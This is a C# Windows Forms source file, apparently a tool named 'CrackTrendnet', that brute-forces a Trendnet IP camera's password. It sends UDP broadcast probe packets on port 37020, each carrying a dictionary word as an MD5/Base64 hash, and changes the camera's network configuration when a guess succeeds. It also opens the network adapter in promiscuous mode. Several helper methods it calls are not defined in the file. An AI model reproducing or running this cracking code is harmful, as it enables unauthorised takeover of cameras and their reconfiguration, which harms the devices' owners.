using PcapDotNet.Core;
using PcapDotNet.Core.Extensions;
using PcapDotNet.Packets.Dns;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.IpV4;
using PcapDotNet.Packets.Transport;
using PcapDotNet.Packets;
using System.Xml;
using System.Xml.Linq;
using System.Xml.XPath;
using System.Security.Cryptography;

using System.Text;
using System.Timers;
using System.Runtime.CompilerServices;

namespace CrackTrendnet
{
    public partial class RecoverPass : Form
    {

        ushort portNum = 37020;
        string sourceIP = "";
        string sourceMAC = "";
        string IP4 = "";
        string payload = "";
        string broadcastIP;
        string currentItem = "";
        int totalWorldlist;
        int wordsDone;
        string broadcastMAC;
        string cameraMAC;
        bool testOK = false;
        Thread crackingRunner;
        XDocument xmlDoc;
        System.Timers.Timer clockTimer = null;
        PacketCommunicator communicator;
        LivePacketDevice selectedDevice;
        public RecoverPass()
        {
            InitializeComponent();
        }

        private void btnBrowseDictFile_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog1 = new System.Windows.Forms.OpenFileDialog();

            openFileDialog1.Title = "Browse Dictionary Files";
            openFileDialog1.ShowDialog();
            txtDictFile.Text = openFileDialog1.FileName;
            if(testOK)
            {
                btnCrack.Enabled = true;
            }
        }

        private void log(string message)
        {
            message = string.Format("{0}: {1}", DateTime.Now, message);
            txtLog.AppendText(message);
            txtLog.AppendText(Environment.NewLine);
        }

        private void btnTest_Click(object sender, EventArgs e)
        {
            DateTime startTime = DateTime.Now;
            LivePacketDevice selectedDevice = null;
            MD5 md5 = MD5.Create();

            //Prepare the payload
            string xmlContent = File.ReadAllText("Template.xml");
            xmlDoc = XDocument.Parse(xmlContent);
            XElement xUuid = xmlDoc.XPathSelectElement("/Probe/Uuid");
            string uuid = (Guid.NewGuid().ToString()).ToUpper();
            xUuid.Value = uuid;
            XElement mac = xmlDoc.XPathSelectElement("/Probe/MAC");
            mac.Value = cameraMAC;
            XElement Password = xmlDoc.XPathSelectElement("/Probe/Password");

            byte[] tmpSource = ASCIIEncoding.ASCII.GetBytes("test");
            byte[] encoded = md5.ComputeHash(tmpSource);
            Password.Value = Convert.ToBase64String(encoded); // MD5, and then Base64 

            XElement IPv4Address = xmlDoc.XPathSelectElement("/Probe/IPv4Address");
            IPv4Address.Value = txtCameraIP.Text;

            XElement IPv4SubnetMask = xmlDoc.XPathSelectElement("/Probe/IPv4SubnetMask");
            IPv4SubnetMask.Value = txtSubnetMask.Text;

            XElement IPv4Gateway = xmlDoc.XPathSelectElement("/Probe/IPv4Gateway");
            IPv4Gateway.Value = txtGatewayIP.Text;
            // TODO: Get the XML ToString working so that I don't have to manually replace extra strings & line breaks.
            Packet p = BuildBroadcastPacket(broadcastIP, portNum, xmlDoc.ToString().Replace(Environment.NewLine, "").Replace(">  <", "><"), sourceMAC, sourceIP);

            // Send the payload to our broadcast address.
            
            testOK = testUDPPacket(p, uuid);
            if (txtDictFile.Text.Length > 0 && testOK)
            {
                btnCrack.Enabled = true;
            }
            // Figure out how to listen for the response.  Should be addressed to the same destination we sent it to!
            log(string.Format("End to End time took {0} milliseconds", DateTime.Now.Subtract(startTime).TotalMilliseconds));
        }

        private void setBusy(bool busy)
        {
            busy = !busy;
            btnBrowseDictFile.Enabled = busy;
            btnCopyLogToClipboard.Enabled = busy;
            btnCrack.Enabled = busy;
            btnTest.Enabled = busy;
            btnOpenSocket.Enabled = busy;
            cmbNetAdapter.Enabled = busy;
        }

        private void btnCrack_Click(object sender, EventArgs e)
        {
            setBusy(true);
            MD5 md5 = MD5.Create();
            bool isCracked = false;

            wordsDone = 1;
            progressBar1.Minimum = 1;
            string[] lines = File.ReadAllLines(txtDictFile.Text);
            progressBar1.Maximum = lines.Length;
            totalWorldlist = lines.Length;
            // foreach line in dict file, send message, wait for response, parse result and quit if we have the right password, print password to log.
            Thread crackingRunner = new Thread(() =>
            {
                foreach (string line in lines)
                {
                    XElement Password = xmlDoc.XPathSelectElement("/Probe/Password");
                    XElement xUuid = xmlDoc.XPathSelectElement("/Probe/Uuid");
                    string uuid = Guid.NewGuid().ToString().ToUpper();
                    xUuid.Value = uuid;


                    byte[] tmpSource = ASCIIEncoding.ASCII.GetBytes(line);
                    byte[] encoded = md5.ComputeHash(tmpSource);
                    Password.Value = Convert.ToBase64String(encoded); // MD5, and then Base64 
                    Packet p = BuildBroadcastPacket(broadcastIP, portNum, xmlDoc.ToString().Replace(Environment.NewLine, "").Replace(">  <", "><"), sourceMAC, sourceIP);
                    if (line.Length > 7 && line.Length < 17)  // don't bother if it is too short or long
                    {
                        if (testPassword(p, uuid))
                        {
                            log(string.Format("Password is Cracked!  Config is updated on Camera!  Password is: {0}", line)); 
                            return;
                        }
                    }
                    wordsDone++;
                }
            });
            crackingRunner.Start();

            clockTimer = new System.Timers.Timer();
            clockTimer.Interval = 10000;
            clockTimer.AutoReset = true;
            clockTimer.Elapsed += Timer_Elapsed;
            clockTimer.Start();

            log(string.Format("Run completed unsuccessfully; tested password count: {0}", wordsDone));
            setBusy(false);
        }



        private void btnCopyLogToClipboard_Click(object sender, EventArgs e)
        {
            Clipboard.Clear();
            Clipboard.SetText(txtLog.Text);
        }

        private void RecoverPass_Load(object sender, EventArgs e)
        {
            broadcastIP = System.Configuration.ConfigurationManager.AppSettings["BroadcastAddress"];
            broadcastMAC = System.Configuration.ConfigurationManager.AppSettings["BroadcastMAC"];
            portNum = ushort.Parse(System.Configuration.ConfigurationManager.AppSettings["DestPort"]);
            cameraMAC = System.Configuration.ConfigurationManager.AppSettings["CameraMAC"];
            txtCameraMAC.Text = cameraMAC;
            IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;
            foreach (LivePacketDevice device in allDevices)
            {
                string firstIP4 = "";
                foreach (DeviceAddress address in device.Addresses)
                {
                    //is it IP4?
                    if (address.Address.Family == SocketAddressFamily.Internet)  // as opposed to Internet6
                    {
                        firstIP4 = address.Address.ToString();
                        localIPs.Add(firstIP4.Split(" ")[1]);
                    }
                }
                cmbNetAdapter.Items.Add(string.Format("{0}:{1}", firstIP4, device.GetMacAddress()));
            }


            
        }

        private void Timer_Elapsed(object sender, ElapsedEventArgs e)
        {
            //progressBar1.Value = wordsDone;
            //progressBar1.Update();

        }

        private void cmbNetAdapter_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void btnOpenSocket_Click(object sender, EventArgs e)
        {
            if (cmbNetAdapter.SelectedItem.ToString().Length > 0)
            {
                btnTest.Enabled = true;
            }

            IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;
            foreach (LivePacketDevice device in allDevices)
            {
                foreach (DeviceAddress address in device.Addresses)
                {
                    if (address.Address.Family == SocketAddressFamily.Internet)  // as opposed to Internet6
                    {
                        IP4 = address.Address.ToString();
                        currentItem = string.Format("{0}:{1}", IP4, device.GetMacAddress());
                        if (currentItem == cmbNetAdapter.SelectedItem.ToString())
                        {
                            // We have our network adapter to use as source!
                            sourceIP = IP4.Split(" ")[1];
                            sourceMAC = device.GetMacAddress().ToString();
                            selectedDevice = device;
                            break;
                        }
                    }
                }
            }

            communicator = selectedDevice.Open(65535, // name of the device
                                                   PacketDeviceOpenAttributes.Promiscuous, // promiscuous mode
                                                   1000); // read timeout
            btnTest.Enabled = true;
        }
    }
}
